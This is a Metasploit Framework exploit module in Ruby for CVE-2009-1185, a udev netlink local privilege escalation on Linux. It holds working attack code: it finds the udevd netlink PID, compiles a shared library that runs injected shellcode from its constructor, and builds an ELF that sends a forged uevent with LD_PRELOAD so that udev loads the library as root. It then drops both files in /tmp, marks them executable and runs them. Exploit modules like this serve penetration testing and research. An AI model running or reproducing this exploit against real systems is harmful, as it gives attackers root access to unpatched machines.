##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/exploit/local/linux_kernel'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/local/unix'

#load 'lib/msf/core/post/file.rb'
#load 'lib/msf/core/exploit/local/unix.rb'
load 'lib/msf/core/exploit/local/linux.rb'
load 'lib/msf/core/exploit/local/linux_kernel.rb'
load 'lib/metasm/metasm/x86_64/compile_c.rb'

class Metasploit4 < Msf::Exploit::Local
	Rank = GreatRanking

	include Msf::Exploit::EXE
	include Msf::Post::File
	include Msf::Post::Common

	include Msf::Exploit::Local::LinuxKernel
	include Msf::Exploit::Local::Linux
	include Msf::Exploit::Local::Unix

	def initialize(info={})
		super( update_info( info, {
				'Name'          => 'Linux udev Netlink Local Privilege Escalation',
				'Description'   => %q{
					Versions of udev < 1.4.1 do not verify that netlink messages are
					coming from the kernel. This allows local users to gain privileges by
					sending netlink messages from userland.

					Ubuntu backported the fix to the following versions: 124-9ubuntu0.2,
					117-8ubuntu0.2, 113-0ubuntu17.2, and 079-0ubuntu35.1
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'kcope',           # discovery, LD_PRELOAD technique
						'Jon Oberheide',   # 95-udev-late.rules REMOVE_CMD technique
						'egypt'            # metasploit module
					],
				'Platform'      => [ 'linux' ],
				'Arch'          => [ ARCH_X86 ],
				'SessionTypes'  => [ 'shell', 'meterpreter' ],
				'References'    =>
					[
						[ 'CVE', '2009-1185' ],
						[ 'BID', '34536' ],
						[ 'URL', 'http://www.ubuntu.com/usn/usn-758-1/' ],
					],
				'Targets'       =>
					[
						[ 'Linux x86',       { 'Arch' => ARCH_X86 } ],
						[ 'Linux x64',       { 'Arch' => ARCH_X86_64 } ],
						#[ 'Command payload', { 'Arch' => ARCH_CMD } ],
					],
				'DefaultOptons' => { 'WfsDelay' => 2 },
				'DefaultTarget' => 0,
				'DisclosureDate' => "",
			}
			))
		register_options([
				OptString.new("WritableDir", [ true, "A directory where we can write files (must not be mounted noexec)", "/tmp" ]),
				OptInt.new("NetlinkPID", [ false, "Usually udevd pid-1.  Default: attempt to autodetect" ]),
			], self.class)
	end

	def exploit
		if datastore["NetlinkPID"] and datastore["NetlinkPID"] != 0
			netlink_pid = datastore["NetlinkPID"]
		else
			print_status("Attempting to autodetect netlink pid...")
			netlink_pid = autodetect_netlink_pid
		end

		if not netlink_pid
			print_error "Couldn't autodetect netlink PID, try specifying it manually."
			print_error "Look in /proc/net/netlink for a PID near that of the udevd process"
			return
		else
			print_good "Found netlink pid: #{netlink_pid}"
		end

		#@payload_path = "#{datastore["WritableDir"]}/payload.so"
		#@evil_path = "#{datastore["WritableDir"]}/exploit"

		@payload_path = "#{datastore["WritableDir"]}/#{Rex::Text.rand_text_alpha(10)}.so"
		@evil_path = "#{datastore["WritableDir"]}/#{Rex::Text.rand_text_alpha(10)}"

		# Compile both things before uploading in case something is broken so we
		# don't end up with a file on target
		so_data  = prepare_payload_so
		elf_data = prepare_exploit_elf(netlink_pid)

		print_status "Writing payload library (#{so_data.length} bytes) to #{@payload_path}"
		write_file(@payload_path, so_data)

		print_status "Writing exploit executable (#{elf_data.length} bytes) to #{@evil_path}"
		write_file(@evil_path, elf_data)

		print_status "chmod'ing and running it..."
		cmd_exec("chmod 777 #{@evil_path} #{@payload_path}")
		cmd_exec("#{@evil_path}")

	end

	def cleanup
		rm_f(@evil_path, @payload_path)
	end

	def autodetect_netlink_pid
		netlink_pid = nil

		case session.type
		when "meterpreter"
			print_status("Meterpreter session, using get_processes to find netlink pid")
			process_list = session.sys.process.get_processes
			udev_proc = process_list.find {|p| p["name"] =~ /udevd/ }
			udev_pid = udev_proc["pid"]
			print_status "udev pid: #{udev_pid}"
			netlink = read_file("/proc/net/netlink")
			netlink.each_line do |line|
				pid = line.split(/\s+/)[2].to_i
				if pid == udev_pid - 1
					netlink_pid = pid
					break
				end
			end
		else
			print_status("Shell session, trying sh script to find netlink pid")
			netlink_pid = cmd_exec(
				%q^
				for netlink_pid in $(awk '{print $3}' /proc/net/netlink |sort -u|grep -v -- -); do
					for udev_pid in $(ps aux | grep [u]devd | awk '{print $2}'); do
						[ $(( $udev_pid-1 )) = $netlink_pid ] && echo $netlink_pid ;
					done;
				done ^)
			netlink_pid = nil if netlink_pid.empty?
		end

		netlink_pid
	end

	def prepare_payload_so
		vprint_status("Compiling payload library")

		#payload_cpu = Metasm::X86_64.new
		payload_cpu = Metasm::Ia32.new
		payload_so = Metasm::ELF.new(payload_cpu)
		payload_cparser = payload_cpu.new_cparser
		payload_cparser.lexer.include_search_path = [
			"external/source/meterpreter/source/bionic/libc/include/",
			"external/source/meterpreter/source/bionic/libc/private/",
			"external/source/meterpreter/source/bionic/libc/bionic/",
			"external/source/meterpreter/source/bionic/libc/kernel/arch-x86/",
			"external/source/meterpreter/source/bionic/libc/kernel/common/",
			"external/source/meterpreter/source/bionic/libc/arch-x86/include/",
		]

		payload_cparser.parse(%Q|
			// Fixes a parse error in bionic's libc/kernel/arch-x86/asm/types.h
			#ifndef __extension__
			#define __extension__
			#endif
			// Fixes a parse error in bionic's libc/include/sys/cdefs_elf.h
			// Doing #if on an undefined macro is fine in GCC, but a parse error in
			// metasm.
			#ifndef __STDC__
			#define __STDC__ 0
			#endif
		|)


		payload_so.parse %q^
			.section ".bss" rwx
			.section ".text" rwx
		^
		enc = payload.encoded
		init = %Q^
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

#define PAGESIZE 0x1000

char shellcode[] = "#{Rex::Text.to_hex(enc, '\x')}";

void __attribute__((constructor))
foo()
{
	int (*fp)();
	fp = mmap(0, PAGESIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

	memcpy(fp, shellcode, sizeof(shellcode));
	if (mprotect(fp, PAGESIZE, PROT_READ|PROT_WRITE|PROT_EXEC)) {
		_exit(1);
	}
	if (!fork()) {
		fp();
	}

	_exit(1);
	return;
}
		^
		#puts init
		payload_cparser.parse init, "payload.c"

		# This is needed in order to take care of __attribute__ stuff that is
		# normally handled by ELF#compile_c. Since we need a manual cparser for
		# setting up the include directories, we have to do it ourselves.
		payload_so.read_c_attrs(payload_cparser)

		asm = payload_cpu.new_ccompiler(payload_cparser, payload_so).compile
		payload_so.parse asm
		payload_so.assemble
		so_data = payload_so.encode_string(:lib)

		#::File.open("payload.so", "wb") {|fd| fd.write so_data }

		so_data
	end

	def prepare_exploit_elf(netlink_pid)
		vprint_status("Compiling exploit executable")

		exploit_exe = Metasm::ELF.new(@cpu)
		exploit_exe.parse %Q|
			#define DEBUGGING
			#define NULL ((void*)0)
			#ifdef __ELF__
				.section ".bss" rwx
				.section ".text" rwx
				.entrypoint
			#endif
			call main
			push eax
			call exit
		|

		# Set up the same include order as the bionic build system.
		# See external/source/meterpreter/source/bionic/libc/Jamfile
		cparser.lexer.include_search_path = [
			"external/source/meterpreter/source/bionic/libc/include/",
			"external/source/meterpreter/source/bionic/libc/private/",
			"external/source/meterpreter/source/bionic/libc/bionic/",
			"external/source/meterpreter/source/bionic/libc/kernel/arch-x86/",
			"external/source/meterpreter/source/bionic/libc/kernel/common/",
			"external/source/meterpreter/source/bionic/libc/arch-x86/include/",
		]

		cparser.parse(%Q|
			#define DEBUGGING
			// Fixes a parse error in bionic's libc/kernel/arch-x86/asm/types.h
			#ifndef __extension__
			#define __extension__
			#endif
			// Fixes a parse error in bionic's libc/include/sys/cdefs_elf.h
			// Doing #if on an undefined macro is fine in GCC, but a parse error in
			// metasm.
			#ifndef __STDC__
			#define __STDC__ 0
			#endif
			#include <sys/types.h>
			#include <stdarg.h>
			#include <stdio.h>
			#include <errno.h>
		|)

		linux_x86_syscall_wrappers(exploit_exe)
		#linux_x64_syscall_wrappers(exploit_exe)

		[
			"external/source/meterpreter/source/bionic/libc/bionic/__errno.c",
			"external/source/meterpreter/source/bionic/libc/bionic/__set_errno.c",
			"external/source/meterpreter/source/bionic/libc/stdio/stdio.c",
		].each do |fname|
			cparser.parse(File.read(fname), fname)
		end

		dev_path = "/dev/metasploit"
		unix_socket_h(exploit_exe)

		main = %Q^
#include <string.h>
#include <linux/netlink.h>
			#include <unistd.h>

int main() {
	int sock;
	struct iovec iov;
	struct sockaddr_nl sa;
	struct msghdr msg;
	char *mp;
	char message[4096];
	char *foo;

	memset(sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	sa.nl_pid = #{netlink_pid};
	sa.nl_groups = 0;

	memset(msg, 0, sizeof(struct msghdr));
	msg.msg_name = (void *)&sa;
	msg.msg_namelen = sizeof(sa);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
	bind(sock, (struct sockaddr *) &sa, sizeof(sa));

	mp = message;
	mp += sprintf(mp, "add@#{dev_path}") + 1;
	mp += sprintf(mp, "ACTION=add") +1;
	mp += sprintf(mp, "SUBSYSTEM=block") + 1;
	mp += sprintf(mp, "DEVPATH=#{dev_path}") + 1;
	mp += sprintf(mp, "MAJOR=8") +1;
	mp += sprintf(mp, "MINOR=1") +1;
	mp += sprintf(mp, "LD_PRELOAD=#{@payload_path}") +1;

	iov.iov_base = (void*)message;
	iov.iov_len = (int)(mp-message);

	sendmsg(sock, &msg, 0);

	close(sock);

	return 0;
}
^
		cparser.parse(main, "main.c")

		asm = @cpu.new_ccompiler(cparser, exploit_exe).compile
		exploit_exe.parse asm
		exploit_exe.assemble
		elf = exploit_exe.encode_string(:bin)

		elf
	end

end
